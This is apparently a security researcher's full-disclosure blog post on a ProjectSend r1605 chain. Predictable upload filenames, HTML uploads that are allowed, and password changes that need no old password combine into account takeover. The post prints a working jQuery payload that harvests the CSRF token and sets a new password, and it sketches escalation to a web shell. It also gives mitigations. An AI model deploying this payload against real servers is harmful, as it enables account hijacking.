---
title: 'ProjectSend - Stored XSS to Account Takeover'
date: 2024-05-06
layout: post
tags:
- 'owasp'
- 'xss'
- 'uploads'
- 'chaining'
published: true
---

I've identified a security concern within the self-hosted file sharing tool [ProjectSend](https://www.projectsend.org/) in the current version r1605. By exploiting a chain of vulnerabilities – including Cross-Site Scripting (XSS), Insecure Direct Object Reference (IDOR), and weaknesses in its change password implementation – an authenticated attacker can force a logged-in user to unknowingly change their account password, by clicking a link.

But let me explain the attack in detail.

<!--more-->

{{< notice info >}}
So, if you use apache2 with htaccess files, this chain is obsolete, as everything is **mitigated** with a `.htaccess` file located in the `uploads/files` directory denying direct calls to HTML files
After writing this blog post, I discovered the `.htaccess` file within the `uploads/files` directory. Apparently the default of Apache is to disallow htaccess overwrite. And the ProjectSend demo at [https://www.projectsend.org/demo](https://www.projectsend.org/demo), I checked against, does not adhere to its own practice of using this `.htaccess` file.

So, if you use apache2 with htaccess files, this chain is obsolete, as everything is **mitigated** with a `.htaccess` file located in the `uploads/files` directory denying direct calls to HTML files in this directory (GitHub: [uploads/files/.htaccess](https://github.com/projectsend/projectsend/blob/develop/upload/files/.htaccess))

**BUT: the weak password change mechanism and the IDOR itself is still valid.**
{{< /notice >}}

##  Do you want files?

You can invite other people to upload files to your server. The uploaded file types can be controlled with an allowlist, which is set through the admin interface in the option `allowed_file_types`.

```
7z,ace,ai,avi,bin,bmp,bz2,cdr,csv,doc,docm,docx,eps,fla,flv,gif,gz,gzip,htm,html,iso,jpeg,jpg,mp3,mp4,mpg,odt,oog,ppt,pptx,pptm,pps,ppsx,pdf,png,psd,rar,rtf,tar,tif,tiff,tgz,txt,wav,xls,xlsm,xlsx,xz,zip
```

These "file types" are basically the allowed extensions. Projectsend checks the extension from the uploaded file against the list of allowed ones. This is **not** bulletproof against some weird polyglot files, but enough to hinder execution of PHP web shells in naive way.

```php
// Validate file has an acceptable extension
if (!file_is_allowed($fileName)) {
    dieWithError('Invalid Extension');
}
```

```php
function file_is_allowed($filename)
{
    if (true == user_can_upload_any_file_type(CURRENT_USER_ID)) {
        return true;
    }

    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $allowed_extensions = explode(',', strtolower(get_option('allowed_zfile_types')));
    if (in_array($extension, $allowed_extensions)) {
        return true;
    }

    return false;
}
```

**BUT**: Lucky for us: The HTML Extension is allowed by default!
![Screenshot of List of allowed Extensions](/img/2024/f4742597f2f55fe937f03050b2ea3610.png)
This is super interesting, as we could use this to upload JavaScript Code, which is executed in the context of the logged-in user and server.

The upload is pretty normal form upload and nothing special. It does a POST request against the endpoint `/includes/upload.process.php`, which returns a JSON String with the filename, id and no information of importance.

```
{"OK":1,"info":{"id":"35","NewFileName":"test.txt"}}
```

This issue is not new and there is even an open GitHub issue for uploading a web shell (GitHub: [#996](https://github.com/projectsend/projectsend/issues/996)), but they always set a prerequisite to disable the allowed file types and complex ways to find the file.

Uploading an HTML File is allowed by default, therefore we only need to find the file!

Downloading a file is done over the `/process.php?do=download` endpoint, which results in a Content-Disposition header, which we don't want in this case.

```http
HTTP/1.1 200 OK
Date: Tue, 04 Jun 2024 19:44:13 GMT
Server: Apache/2.4.55 (Ubuntu)
Expires: -1
Cache-Control: public, must-revalidate, post-check=0, pre-check=0
Pragma: public
Content-Disposition: attachment; filename=test.txt
Content-Length: 5
Accept-Ranges: bytes
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: application/octet-stream

blub
```

##  Gimme Raaaws!

The GitHub issue tackles this problem by relying on the path traversal (GitHub: [#994](https://github.com/projectsend/projectsend/issues/994)) and moving the htaccess file and others and therefore enabling the indexing of the upload directory.

The Web shell Issue (GitHub: [#994](https://github.com/projectsend/projectsend/issues/994)) even tells us, it is in `uploads/files/`. But we are facing another problem: the uploaded filenames are changed!

![Output of the command ls with the filenames in the form: 1717526802-aa59eb0ae65e9a49c24c70a09d804b854c62d8d2-pwned.html](/img/2024/2132975b31bf8e372cc20c0afd53f6bc.png)
Looking closely, the filenames are not UUIDs or random, as far as we can determine. The first 8 digits seem to be a Unix timestamp, after that follows a hash and the original filename in the end.

Dumping the unknown hash into a hash analyzer comes back with a close match for a SHA1 Hash:
![Screenshot of a hashanalyzer, which outputs the hashtype as SHA1](/img/2024/77cb5440ce3c580670a3c959e1845994.png)

And if we just search for the hash `d033e22ae348aeb5660fc2140aec35850c4da997` on [DuckDuckGo](https://duckduckgo.com/?q=d033e22ae348aeb5660fc2140aec35850c4da997&t=h_&ia=web) simply tells us it is the SHA1 hash for `admin`. It seems the hash in the filename is just the SHA1 from the uploader's username.

To check this theory, we can generate the SHA1 from the other user `testclient`:
![CyberChef Screenshot with a SHA1 Hash for the string "testclient"](/img/2024/813d7f9ca7ee9d8879c83747f79f1a99.png)


Yay, they match.

We determined the structure of the filename `UnixTimestamp-sha1(username)-origFileName`.

The next problem is the timestamp. It is probably been taken from the server time, but how do we know the time from the server?

Looking at the Response of the upload request, we have a time and date in the `Date`-Header
```http
HTTP/1.1 200 OK
Date: Sat, 23 Mar 2024 11:09:34 GMT
Server: Apache/2.4.55 (Ubuntu)
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Last-Modified: Sat, 23 Mar 2024 11:09:34 GMT
Cache-Control: post-check=0, pre-check=0
Content-Length: 53
Connection: close
Content-Type: text/html; charset=UTF-8

{"OK":1,"info":{"id":"14","NewFileName":"test.html"}}
```

This can be parsed to have a rough estimation of the uploaded time, and we can generate a search in a fixed timeframe of maybe one to two seconds before and after the response time, and we should hit our uploaded file.

## Changing the Password

We can now upload files and find the raw file on the server to send the link to our victim, but I promised we are changing passwords with this.

![Screenshot of form to change user information including the password](/img/2024/297b05958d4cfd5989a778cffbcd757b.png)

Do you see a problem in the user edit dialog here?

The request to change the password only needs a CSRF Token and **no** old password. As we are able to execute JavaScript in the context of a logged-in user, we can send the form. We just need to get the CSRF Token.

Getting the token is quite easy, as we are operating from the context of the server as well, therefore we can just get the edit user account form and parse all the relevant data from this form. To make things easier, we are simply using the internal jQuery library from ProjectSend.

```html
<script name = "jquery" src = "{URL}/assets/lib/jquery/jquery.min.js?v=3.6.1" type = "text/javascript"> </script>
<script>
$.ajax({
    url: '{URL}/users-edit.php?id=1',
    type: 'GET',
    xhrFields: {
        withCredentials: true
    },
    success: function(data) {
        customPassword = "password1"
        var html = $(data)
        var form = html.find('#user_form');
        form.find('input[type="password"]').val(customPassword);
        var serializedData = form.serialize();
        console.log(serializedData);
        console.log('/' + form.attr('action'))
        $.ajax({
            url: '/' + form.attr('action'),
            type: form.attr('method'),
            data: serializedData,
            success: function(response) {
                console.log("Form submitted successfully:", response);
            },
            error: function(xhr, status, error) {
                console.error("Error submitting form:", error);
            }
        });
    },
    error: function(xhr, status, error) {
        // This function is called if the request fails
        console.log("Error fetching the content: " + error); // Logs error information
    }
});
</script>
```

This code does not consider all users and just focuses on exploiting the first user account. You have to search for another request to get the userid from the logged-in user, which should be doable.

If you get an admin account it probably won't matter anyway, as the admin account is allowed to edit anybody.

## The final exploit

We can automate this process by automatically uploading an HTML-File as a logged-in user, and searching for the relevant Raw-File. Afterward we can send this link to our victim and hope for a click.

![GIF of the command line executing a python exploit.py script, which automates the process described in this post](/img/2024/512030d428fc05cc47ce4c5bc02f9361.gif)

## Mitigations
We have to talk about different ways to tackle this. The first and foremost would be some code changes like:

- putting a random string or UUID into the filename (filenames are located in the DB anyway)
- move files in a directory outside the root directory or documentation about access prevention
- add the need for the old password in a password change

This is everything you, as a user, can't do.

But I have two tips for you:
- Add a `.htaccess` file in `uploads/files` with the content `deny from all`, which prevents direct access to the files, but allows the PHP process to read and serve them through the frontend.
- Disable HTML extensions

## Disclosure Explanation
I tried. I wrote to ProjectSend end of March on their contact email address from the [SECURITY.md](https://github.com/projectsend/projectsend/blob/develop/SECURITY.md) file and proposed multiple solutions to tackle this problem. I have never heard back from them. Maybe the project is dead? Not sure...

Furthermore, looking into open vulnerabilities from 2021 and open tickets of user asking for security contacts, my hopes are not high, these are going to be fixed.

As this is software which is mostly used within a business context, some parts of it are already in an open issue (See References) and it can be solved on the user side without code changes, I opted for full disclosure of this chain.

## Reflections
- If you get an admin account, you could disable the `allowed_file_types` and upload a web shell. You could probably do this with this XSS as well and just have one nifty exploit for one click from XSS to RCE.
- XSS can be used for so much more, than just stealing cookies!!
- If you don't want stuff to be found, use random strings and not some weird hashing+timestamp+etc.
	- I think it was just done to prevent name collisions and not security by obscurity.
- Stuff, which should just be referenced through a script, should not be in an accessible directory!
- This would make a nice CTF challenge.

## References
- ProjectSend: Path Traversal in `import-orphans.php` (https://github.com/projectsend/projectsend/issues/994)
- ProjectSend: RCE through this Path traversal (https://github.com/projectsend/projectsend/issues/996)
- ProjectSend: Asking for security contact (https://github.com/projectsend/projectsend/issues/1305)
- ProjectSend: Direct Object Reference (https://github.com/projectsend/projectsend/issues/992)
- Cross-Site-Scripting Explanation (https://owasp.org/www-community/attacks/xss/)
- IDOR Explanation (https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- CyberChef (https://gchq.github.io/CyberChef/)